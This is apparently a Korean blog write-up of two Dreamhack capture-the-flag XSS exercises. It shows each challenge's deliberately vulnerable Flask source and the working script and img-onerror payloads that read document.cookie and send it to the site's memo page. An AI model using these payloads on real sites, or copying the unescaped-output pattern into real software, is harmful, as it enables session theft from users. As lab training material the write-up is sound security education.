# Cross Site Scripting(XSS)

XSS는 클라이언트 사이드 취약점 중 하나로, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행 할 수 있다. 특정 계정의 세션 정보를 탈취하고 해당 계정으로 임의의 기능을 수행할 수 있는 것이다.

| 종류 | 설명 |
| --- | --- |
| Stored XSS | XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS |
| Reflected XSS | XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS |
| DOM-based XSS | XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS |
| Universal XSS | 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS |

아래의 실습은 `<script>`를 이용하여 진행할 것이다.

# Exercise

## xss-1

XSS를 통해 임의의 사용자 쿠키를 탈취하는 것이다. 

```bash
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

# POST => params 파라미터에 값과 쿠키에 FLAG를 포함해서 chech_xss 함수를 호출한다, check_xss는 read_rul 함수를 호출해 vuln 엔드포인트에 접속
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

@app.route("/")
def index():
    return render_template("index.html")

# vuln 페이지를 구성하는 코드, 이용자가 전달한 param 파라미터 값을 출력
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "") # 이용자가 입력한 vuln 인자를 가져온다
    return param # 이용자의 입력값을 화면 상에 표시

# method에 따른 요청마다 다른 기능을 수행한다
# GET => 이용자에게 URL을 입력받는 페이지를 제공
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'

memo_text = ""

# 이용자가 전달한 memo 파라미터 값을 render_template 함수를 통해 기록하고 출력
@app.route("/memo") # memo 페이지 라우팅
def memo(): # memo 함수 선언
    global memo_text # 메모를 전역변수(global)로 참조
    text = request.args.get("memo", "") # 이용자가 전송한 memo 입력값을 가져옴
    memo_text += text + "\n" # 이용자가 전송한 memo 입력값을 memo_txt에 추가
    return render_template("memo.html", memo=memo_text) # 사이트에 기록된 memo_text를 화면에 출력

app.run(host="0.0.0.0", port=8000)

```

### 취약점

vuln과 memo 페이지에서는 이용자의 입력값을 페이지에 출력한다.

memo는 `render_template` 함수를 사용해 `memo.html`을 출력한다

`render_template` 함수는 전달된 템플릿 변수를 기록할 때 HTML 엔티티 코드로 변환해 저장하기 때문에 XSS가 발생하지 않지만, vuln은 이용자가 입력한 값을 페이지 그대로 출력하기 때문에 XSS 가 발생한다.

- `location.href` : 전체 URL을 반환하거나, URL을 업데이트 할 수 있는 속성값
- `document.cookie` : 해당 페이지에서 사용하는 쿠키 값을 읽고, 쓰는 속성값

`/flag` 에 접속해 `<script>location.href = "/memo?memo=" + document.cookie;</script>`  를 삽입해 쿠키 값을 얻어낸다

![Untitled](/assets/img/Dreamhack/XSS/Untitled.png)

이후 `/memo` 에 접속해 찍혀있는 값을 확인한다.

![Untitled](/assets/img/Dreamhack/XSS/Untitled1.png)

사용자의 입력값에 별다른 검증 없이 페이지를 출력했기에 발생할 수 있는 문제점이다. XSS 공격은 주로 이용자의 입력값이 출력되는 페이지에서 발생하며, 해당 공격을 통해 타 이용자의 브라우저에 저장된 쿠키 및 세션 정보를 탈취 할 수 있다.

## xss-2

다른 이용자의 클라이언트에 저장된 쿠키를 탈취하는 실습

```bash
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

# chech_xss 함수에서는 , 이용자가 flag에 POST로 전송한 param 값이 XSS 공격에 사용될 수 있는 값인지 아닌지 확인한다
# 이때, check_xss에서는, 이용자가 flag 페이지에 입력한 param을 포함하여 vuln페이지에 접근하는 URL을 생성
# 결과적으로, read_url 함수를 통해 vuln 페이지에 접근하는 URL과 사용자의 쿠기가 전달되는 것
def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

@app.route("/")
def index():
    return render_template("index.html")

# XSS-1과 다르게 구성되어있다
# get으로 사용자가 입력한 param을 바로 return하는 형태가 아니라, render_template 함수를 사용하고 있다는 것이다
# render_template 함수는 flask에서 제공하는 함수로, Jinja2 템플릿 엔진을 사용하여 HTML 템플릿 파일을 렌더링한다
# 주어진 템플릿 파일의 이름과 함께 전달된 변수나 값들을 템플릿에 적용하여 완성된 HTML을 생성하는 것이다
@app.route("/vuln")
def vuln():
    return render_template("vuln.html")

# render_template 함수를 사용하면, 전달된 템플릿 변수가 기록될 때 HTML 엔티티코드로 변환해 저장되기 때문에 XSS가 발생하지 않게 됨
# 이용자가 입력한 값을 페이지에 그대로 출력하지 않는다는 것이다
# xss-1 은 /vuln 페이지에 접속시 alert가 떳다면 이번에는 <script>alert(1)</script>를 입력하더라고 XSS가 발생하지 않는다는 것을 확인 가능

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'

memo_text = ""

# XSS-1 문제와 동일하게 구성되어있다. 
# 이용자가 전달한 memo 파라미터 값을 render_template 함수를 통해 기록하고 출력
# 사용자가 URL의 memo 파라미터에 어떤 값을 입력하는지에 따라 화면에 출력되는 값도 달라지게 된다
@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)

app.run(host="0.0.0.0", port=8000)

```

xss-1과 다르게 vuln 페이지에서 param에 `<script>alert(1)</script>` 를 입력하더라고 XSS가 발생하지 않는다.

문제를 해결하기 위해서 vuln.html에서 발생하는 XSS 취약점을 통해 임의 이용자의 쿠키를 탈취해야한다

`<img src>` 태그를 사용하여 다음과 같은 익스플로잇 코드 작성이 가능하다

`<img src="XSS-2" onerror="location.href='/memo?memo='+document.cookie">`

이 코드를 `/flag` 페이지의 param 부분에 입력하면, memo에서 임의의 이용자의 쿠키정보를 확인할 수 있게 된다. 

![Untitled](/assets/img/Dreamhack/XSS/Untitled2.png)

![Untitled](/assets/img/Dreamhack/XSS/Untitled3.png)